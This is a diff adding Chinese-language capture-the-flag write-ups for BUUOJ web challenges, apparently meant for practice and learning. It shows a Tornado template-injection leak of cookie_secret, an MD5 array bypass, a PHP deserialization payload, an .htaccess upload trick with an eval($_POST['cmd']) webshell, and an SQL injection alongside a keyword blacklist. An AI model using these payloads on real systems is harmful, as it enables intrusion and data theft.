@@ -1943,8 +1943,172 @@ else{
 ?>
 ```
 
+```py
+import base64
+b = base64.b64encode(b'welcome to the zjctf').decode()
+print(b)
+d2VsY29tZSB0byB0aGUgempjdGY=
+```
 ```sh
 GET /?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=s:6:%22%22ls%20%2f%22%22; HTTP/1.1
 
 
+```
+### [easy_tornado](https://buuoj.cn/challenges#[%E6%8A%A4%E7%BD%91%E6%9D%AF%202018]easy_tornado)
+```sh
+hash = md5(cookie_secret+md5(filename))
+```
+已知三组filename和hash并不能算出cookie_secret，也不能算得其它filename对应的hash
+```sh
+GET /error?msg={{handler.settings}} HTTP/1.1
+```
+访问error页面，得到cookie_secret
+```html
+<body>{&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;95cf769f-f7df-4b9b-ba50-a650d346b6e5&#39;}</body>
+```
+
+```py
+import hashlib
+file = '/fllllllllllllag'
+secret = '95cf769f-f7df-4b9b-ba50-a650d346b6e5'
+m1 = hashlib.md5(file.encode()).hexdigest()
+h = hashlib.md5((secret + m1).encode()).hexdigest()
+print(h)
+```
+### [Ez_bypass](https://buuoj.cn/challenges#[MRCTF2020]Ez_bypass)
+```js
+I put something in F12 for you include 'flag.php'; $flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'; if(isset($_GET['gg'])&&isset($_GET['id'])) { $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) && $id !== $gg) { echo 'You got the first step'; if(isset($_POST['passwd'])) { $passwd=$_POST['passwd']; if (!is_numeric($passwd)) { if($passwd==1234567) { echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); } else { echo "can you think twice??"; } } else{ echo 'You can not get it !'; } } else{ die('only one way to get the flag'); } } else { echo "You are not a real hacker!"; } } else{ die('Please input first'); } }Please input first
+```
+get转post，数组绕过md5
+```
+GET /?gg[]=1&id[]=2&passwd[]=1234567 HTTP/1.1
+
+
+POST /?gg[]=1&id[]=2 HTTP/1.1
+......
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 19
+
+passwd=1234567t
+```
+### [AreUSerialz](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz)
+```php
+<?php
+
+include("flag.php");
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = "1";
+        $filename = "/tmp/tmpfile";
+        $content = "Hello World!";
+        $this->process();
+    }
+
+    public function process() {
+        if($this->op == "1") {
+            $this->write();
+        } else if($this->op == "2") {
+            $res = $this->read();
+            $this->output($res);
+        } else {
+            $this->output("Bad Hacker!");
+        }
+    }
+
+    private function write() {
+        if(isset($this->filename) && isset($this->content)) {
+            if(strlen((string)$this->content) > 100) {
+                $this->output("Too long!");
+                die();
+            }
+            $res = file_put_contents($this->filename, $this->content);
+            if($res) $this->output("Successful!");
+            else $this->output("Failed!");
+        } else {
+            $this->output("Failed!");
+        }
+    }
+
+    private function read() {
+        $res = "";
+        if(isset($this->filename)) {
+            $res = file_get_contents($this->filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo "[Result]: <br>";
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this->op === "2")
+            $this->op = "1";
+        $this->content = "";
+        $this->process();
+    }
+
+}
+
+function is_valid($s) {
+    for($i = 0; $i < strlen($s); $i++)
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{'str'})) {
+
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}
+```
+反序列化，但不能用protected，改用public可以
+```php
+<?php
+class FileHandler {
+    protected $op = 2;
+    protected $filename = "flag.php";
+    protected $content;
+}
+$Handler = new FileHandler();
+echo serialize($Handler)
+?>
+```
+```sh
+GET /?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;} HTTP/1.1
+```
+### [BabyUpload](https://buuoj.cn/challenges#[GXYCTF2019]BabyUpload)
+上传后缀不能包含`ph`，类型必须是`image/jpeg`，文件内容不能有<php ?>标识。故考虑先上传.htaccess
+```sh
+<FilesMatch "shell">
+SetHandler application/x-httpd-php
+</FilesMatch>
+```
+再直接上传图像马
+```php
+------WebKitFormBoundaryTPmfk7bmf17P7r0z
+Content-Disposition: form-data; name="uploaded"; filename="shell.jpg"
+Content-Type: image/jpeg
+
+<script language="php">eval($_POST['cmd']);</script>
+```
+使用AntSword工具即可
+### [Blacklist](https://buuoj.cn/challenges#[GYCTF2020]Blacklist)
+```sql
+1 or extractvalue(1, (select database()) )
+
+return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
 ```
